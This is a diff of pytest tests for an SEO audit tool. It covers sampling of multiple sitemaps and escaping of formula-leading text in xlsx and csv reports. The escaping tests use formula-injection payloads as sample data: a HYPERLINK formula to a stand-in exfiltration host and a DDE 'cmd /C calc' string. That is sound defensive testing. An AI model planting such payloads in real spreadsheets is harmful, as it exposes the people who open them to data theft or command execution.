@@ -5,8 +5,10 @@ from __future__ import annotations
 import json
 
 from seohead.audit.site import (
+    PAGE_TOOLS,
     SCHEMA,
     SEVERITY_RULES,
+    SITE_TOOLS,
     _first_h1,
     _page_row,
     _urls_from_sitemap,
@@ -14,6 +16,7 @@ from seohead.audit.site import (
     classify,
 )
 from seohead.reports import FORMATS, build_report
+from seohead.servers import handlers
 
 # ── finding severity ─────────────────────────────────────────────────────────
 
@@ -70,6 +73,42 @@ def test_nested_shapes_are_still_walked():
     """A response-shape change must not silently reduce the audit to zero URLs."""
     weird = {"sitemaps": [{"entries": [{"loc": "https://example.com/deep"}]}]}
     assert _urls_from_sitemap(weird, 5) == ["https://example.com/deep"]
+
+
+# ── multiple declared sitemaps (#200) ────────────────────────────────────────
+
+FIRST_SITEMAP = "https://example.test/sitemap-pages.xml"
+SECOND_SITEMAP = "https://example.test/sitemap-products.xml"
+
+
+def test_every_declared_sitemap_is_sampled_not_just_the_first(monkeypatch):
+    """robots.txt can declare more than one independent Sitemap: directive; a page
+    only that second sitemap lists must still reach page selection, not be
+    silently dropped because ``site.py`` only ever fetched the first."""
+    calls: list[str] = []
+
+    def fake_robots_check(url: str) -> dict:
+        return {"ok": True, "sitemaps": [FIRST_SITEMAP, SECOND_SITEMAP]}
+
+    def fake_sitemap_crawl(url: str | None = None, **_kw: object) -> dict:
+        calls.append(url or "")
+        loc = (
+            "https://example.test/page-a"
+            if url == FIRST_SITEMAP
+            else "https://example.test/product-b"
+        )
+        return {"ok": True, "urls": [{"loc": loc}]}
+
+    monkeypatch.setattr(handlers, "robots_check", fake_robots_check)
+    monkeypatch.setitem(handlers.HANDLERS, "sitemap_crawl", fake_sitemap_crawl)
+
+    skip = [t for t in SITE_TOOLS if t not in {"robots_check", "sitemap_crawl"}] + list(PAGE_TOOLS)
+    result = audit_site("https://example.test/", skip=skip)
+
+    assert calls == [FIRST_SITEMAP, SECOND_SITEMAP]
+    selected = {page["url"] for page in result["pages"]}
+    assert "https://example.test/page-a" in selected
+    assert "https://example.test/product-b" in selected
 
 
 # ── page row ─────────────────────────────────────────────────────────────────
@@ -270,6 +309,54 @@ def test_excel_sheets_have_no_blank_row_under_the_header(tmp_path):
         assert ws.max_row - 1 == expected, f"{name}: unexpected rows below the header"
         first = next(ws.iter_rows(min_row=2, values_only=True))
         assert any(v is not None for v in first), f"{name}: first data row is empty"
+
+
+def test_formula_leading_titles_are_neutralized_in_xlsx(tmp_path):
+    """A crawled page's own title must not become a live spreadsheet formula (#153)."""
+    import copy
+
+    from openpyxl import load_workbook
+
+    for lead in ("=", "+", "-", "@"):
+        doc = copy.deepcopy(DOCUMENT)
+        doc["pages"][0]["title"] = f'{lead}HYPERLINK("http://evil.example/steal","click")'
+        doc["findings"][0]["text"] = f"{lead}cmd|' /C calc'!A0"
+        target = tmp_path / f"r-{ord(lead)}.xlsx"
+        build_report(doc, fmt="xlsx", path=str(target))
+        wb = load_workbook(target)
+        title_cell = wb["Pages"]["C2"]
+        finding_cell = wb["Findings"]["D2"]
+        assert title_cell.data_type == "s", f"lead {lead!r}: title became a live formula"
+        assert finding_cell.data_type == "s", f"lead {lead!r}: finding text became a live formula"
+        assert title_cell.value == "'" + doc["pages"][0]["title"]
+
+
+def test_formula_leading_titles_are_neutralized_in_csv(tmp_path):
+    """The CSV field must not begin with a formula-leading character either (#153)."""
+    import copy
+    import csv
+
+    for lead in ("=", "+", "-", "@"):
+        doc = copy.deepcopy(DOCUMENT)
+        doc["pages"][0]["title"] = f'{lead}HYPERLINK("http://evil.example/steal","click")'
+        target = tmp_path / f"r-{ord(lead)}.csv"
+        build_report(doc, fmt="csv", path=str(target))
+        with target.with_suffix(".pages.csv").open(encoding="utf-8-sig", newline="") as fh:
+            rows = list(csv.reader(fh, delimiter=";"))
+        title_field = rows[1][2]  # columns: url, status, title, ...
+        assert not title_field.startswith(lead), f"lead {lead!r} reached the CSV cell unescaped"
+        assert title_field.startswith("'")
+
+
+def test_ordinary_titles_are_written_byte_for_byte_unchanged(tmp_path):
+    """Titles/finding text with no formula-leading character must pass through untouched."""
+    from openpyxl import load_workbook
+
+    target = tmp_path / "r.xlsx"
+    build_report(DOCUMENT, fmt="xlsx", path=str(target))
+    wb = load_workbook(target)
+    assert wb["Pages"]["C2"].value == DOCUMENT["pages"][0]["title"]
+    assert wb["Findings"]["D2"].value == DOCUMENT["findings"][0]["text"]
 
 
 def test_missing_key_security_headers_are_warnings_not_notices():
